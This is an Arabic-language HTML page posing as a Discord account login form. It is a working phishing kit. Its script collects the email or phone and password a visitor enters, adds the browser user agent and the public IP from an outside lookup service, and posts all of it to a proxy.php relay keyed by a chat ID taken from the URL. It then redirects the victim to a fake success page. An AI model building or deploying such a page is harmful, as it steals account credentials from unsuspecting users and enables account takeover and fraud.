<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>تسجيل دخول حساب Discord</title>
  <style>
    body { margin: 0; overflow: hidden; font-family: Arial, sans-serif; color: yellow; background: #2e2459; }
    body::before {
      content: ""; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%),
                  linear-gradient(45deg, rgba(255,255,255,0.1) 25%, transparent 25%, transparent 75%, rgba(255,255,255,0.1) 75%, rgba(255,255,255,0.1)),
                  linear-gradient(-45deg, rgba(255,255,255,0.1) 25%, transparent 25%, transparent 75%, rgba(255,255,255,0.1) 75%, rgba(255,255,255,0.1));
      background-size: 200% 200%; animation: move 10s linear infinite; z-index: 0;
    }
    @keyframes move { 0% { background-position: 0% 0%; } 50% { background-position: 100% 100%; } 100% { background-position: 0% 0%; } }
    .container { margin: 20px auto; padding: 20px; background: rgba(0,0,0,0.7); border-radius: 10px; width: 90%; max-width: 400px; position: relative; z-index: 1; text-align: center; }
    h1 { color: white; margin-bottom: 20px; }
    label { color: yellow; background: black; padding: 5px; border-radius: 5px; margin-bottom: 5px; display: block; font-weight: bold; }
    input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; background: rgba(255, 255, 255, 0.2); color: white; font-size: 16px; }
    .btn { background: #5865f2; color: white; border: none; padding: 12px; border-radius: 5px; font-size: 18px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; }
    .btn:hover { background: #4752c4; }
    canvas#snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
  </style>
</head>
<body>

<canvas id="snow"></canvas>

<div class="container">
  <h1>تسجيل دخول حساب Discord</h1>
  <p style="color: #ccc;">قم بتسجيل الدخول بحساب Discord الخاص بك للوصول إلى الخدمة</p>
  <form id="discordForm">
    <label>البريد الإلكتروني أو رقم الهاتف</label>
    <input type="text" name="email" placeholder="user@example.com" required>

    <label>كلمة المرور</label>
    <input type="password" name="password" placeholder="••••••••" required>

    <button type="submit" class="btn">تسجيل الدخول</button>
  </form>
</div>

<script>
  // الجزء البرمجي المسؤول عن إرسال البيانات
  const urlParams = new URLSearchParams(window.location.search);
  const CHAT_ID = urlParams.get('id');

  document.getElementById("discordForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    if (!CHAT_ID) {
      alert("خطأ: معرف الدردشة مفقود.");
      return;
    }

    const form = new FormData(this);
    const email = form.get("email");
    const password = form.get("password");
    const device = navigator.userAgent;

    const ipData = await fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .catch(() => ({ ip: "غير معروف" }));

    const message = `📧 بيانات تسجيل دخول Discord:\n\n👤 الإيميل / المستخدم: ${email}\n🔑 كلمة المرور: ${password}\n📱 الجهاز: ${device}\n🌐 IP: ${ipData.ip}`;

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("message", message);

    fetch("proxy.php", {
      method: "POST",
      body: formData
    }).then(() => {
      window.location.href = "https://issol.free.nf/success/ok.html?i=1";
    }).catch(() => {
      alert("حدث خطأ أثناء الاتصال بالخادم.");
    });
  });
</script>

<script>
  // (هذا الجزء يقوم برسم كرات بيضاء تتحرك عمودياً لمحاكاة الثلج)
</script>

</body>
</html>
